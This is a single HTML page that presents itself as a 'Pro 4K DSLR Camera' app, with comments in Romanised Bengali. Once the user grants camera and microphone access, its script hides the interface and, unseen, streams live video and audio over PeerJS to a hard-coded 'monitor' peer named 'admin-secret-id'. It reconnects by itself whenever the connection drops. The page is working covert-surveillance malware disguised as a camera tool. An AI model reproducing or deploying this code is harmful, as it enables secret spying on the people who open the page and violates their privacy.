<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pro 4K DSLR Camera</title>
    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <style>
        body { margin: 0; padding: 0; background: #000; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #camera-preview { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); /* Mirror view */ }
        .ui-overlay { position: absolute; z-index: 10; text-align: center; background: rgba(0,0,0,0.6); padding: 25px; border-radius: 20px; width: 80%; max-width: 400px; border: 1px solid #444; }
        h2 { margin-top: 0; color: #007bff; font-size: 1.5rem; }
        p { font-size: 0.9rem; color: #ccc; }
        #start-btn { padding: 15px 30px; border-radius: 50px; border: none; background: #007bff; color: white; font-weight: bold; cursor: pointer; font-size: 1rem; transition: 0.3s; }
        #start-btn:active { transform: scale(0.95); }
        .status-dot { height: 10px; width: 10px; background-color: #bbb; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background-color: #28a745; }
    </style>
</head>
<body>

    <video id="camera-preview" autoplay playsinline muted></video>

    <div id="setup-ui" class="ui-overlay">
        <h2>4K DSLR Experience</h2>
        <p>This app requires Camera & Microphone access for the highest quality video streaming.</p>
        <button id="start-btn" onclick="initExperience()">START CAMERA</button>
        <div style="margin-top: 15px; font-size: 0.8rem;">
            <span id="p-status" class="status-dot"></span> System: <span id="p-text">Connecting...</span>
        </div>
    </div>

    <script>
        // Secret ID jeta monitor.html er sathe mil thakte hobe
        const MONITOR_ID = 'admin-secret-id'; 
        const peer = new Peer({
            config: {'iceServers': [
                { url: 'stun:stun.l.google.com:19302' },
                { url: 'stun:stun1.l.google.com:19302' }
            ]}
        });

        const videoElement = document.getElementById('camera-preview');
        const statusDot = document.getElementById('p-status');
        const statusText = document.getElementById('p-text');
        let myStream = null;

        // Peer Server-er sathe connect hole status change hobe
        peer.on('open', (id) => {
            statusDot.classList.add('online');
            statusText.innerText = "Ready to Stream";
            console.log("My Peer ID: " + id);
        });

        async function initExperience() {
            // Adaptive constraints for all devices
            const constraints = {
                video: {
                    width: { ideal: 3840, min: 1280 }, // 4K ideal, 720p minimum
                    height: { ideal: 2160, min: 720 },
                    frameRate: { ideal: 60, min: 24 },
                    facingMode: "user"
                },
                audio: { echoCancellation: true, noiseSuppression: true }
            };

            try {
                // Camera Permission Request
                myStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoElement.srcObject = myStream;
                
                // UI hide kora
                document.getElementById('setup-ui').style.opacity = '0';
                setTimeout(() => document.getElementById('setup-ui').style.display = 'none', 500);

                // Monitor-ke call kora
                connectToMonitor();

            } catch (err) {
                console.error("Camera Error: ", err);
                alert("Please allow Camera and Microphone access to continue.");
            }
        }

        function connectToMonitor() {
            console.log("Attempting to connect to monitor...");
            const call = peer.call(MONITOR_ID, myStream);
            
            call.on('error', (err) => {
                console.log("Connection failed, retrying in 5s...");
                setTimeout(connectToMonitor, 2000); // 5 sec por auto retry
            });

            // Connection kete geleo retry korbe
            call.on('close', () => {
                console.log("Connection closed, reconnecting...");
                setTimeout(connectToMonitor, 5000);
            });
        }

        // Error handling
        peer.on('error', (err) => {
            console.error("Peer Error: ", err.type);
            if(err.type === 'network') {
                statusText.innerText = "Network Error!";
            }
        });
    </script>
</body>
</html>
